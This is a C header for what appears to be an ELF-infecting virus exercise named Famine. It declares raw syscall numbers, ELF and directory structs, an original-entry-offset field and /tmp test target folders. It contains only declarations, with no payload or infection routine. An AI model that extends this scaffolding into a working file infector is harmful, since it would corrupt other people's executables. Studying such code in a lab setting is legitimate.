#ifndef FAMINE_H
# define FAMINE_H

#include <string.h>
#include <stdint.h>
#include <sys/types.h>

# include <stdio.h>
# include <errno.h>

#ifdef DEBUG
#define PRINT(...) printf(__VA_ARGS__)
#else
#define PRINT(...)
#endif

#ifdef ERROR
#define ERR_SYS(...) perror(__VA_ARGS__)
#define ERR(...) fprintf(stderr, __VA_ARGS__);
#else
#define ERR_SYS(...)
#define ERR(...)
#endif

#define STDOUT_FILENO 1
#define STDERR_FILENO 2

#define PROT_READ 1
#define PROT_WRITE 2
#define PROT_EXEC 4
#define MAP_PRIVATE 2
#define MAP_ANONYMOUS 32
#define MAP_FAILED ((void *)-1)


#define SYS_READ 0
#define SYS_WRITE 1
#define SYS_OPEN 2
#define SYS_CLOSE 3
#define SYS_STAT 4
#define SYS_FSTAT 5
#define SYS_LSEEK 8
#define SYS_MMAP 9
#define SYS_MUNMAP 11
#define SYS_EXECVE 59
#define SYS_EXIT 60
#define SYS_GETDENTS64 217

#define test_f "/tmp/test/"
#define test2_f "/tmp/test2/"

#define SEEK_END 2

#define O_RDONLY 0

#define DT_REG 8
#define DT_DIR 4

#define EI_NIDENT 16


//typedef unsigned long size_t;
//typedef long ssize_t;
//typedef long off_t;
//typedef long ino_t;
//
//typedef unsigned long uint64_t;
//typedef long int64_t;
//typedef unsigned int uint32_t;
//typedef int int32_t;
//typedef unsigned short uint16_t;
//typedef short int16_t;
//typedef unsigned char uint8_t;
//typedef char int8_t;


typedef struct data_s {
	int						_fd;
	uint8_t					*_file_map;
	size_t					_file_size;
	uint64_t				_oentry_off;
} data_t;

struct linux_dirent {
	ino_t d_ino;
	off_t d_off;
	unsigned short d_reclen;
	unsigned char d_type;
	char d_name[];
};

struct Ehdr {
	unsigned char e_ident[EI_NIDENT];
	uint16_t e_type;
	uint16_t e_machine;
	uint32_t e_version;
	uint64_t e_entry;
	uint64_t e_phoff;
	uint64_t e_shoff;
	uint32_t e_flags;
	uint16_t e_ehsize;
	uint16_t e_phentsize;
	uint16_t e_phnum;
	uint16_t e_shentsize;
	uint16_t e_shnum;
	uint16_t e_shstrndx;
};

struct Phdr {
	uint32_t p_type;
	uint32_t p_flags;
	uint64_t p_offset;
	uint64_t p_vaddr;
	uint64_t p_paddr;
	uint64_t p_filesz;
	uint64_t p_memsz;
	uint64_t p_align;
};

long _syscall(long number, ...);

#endif
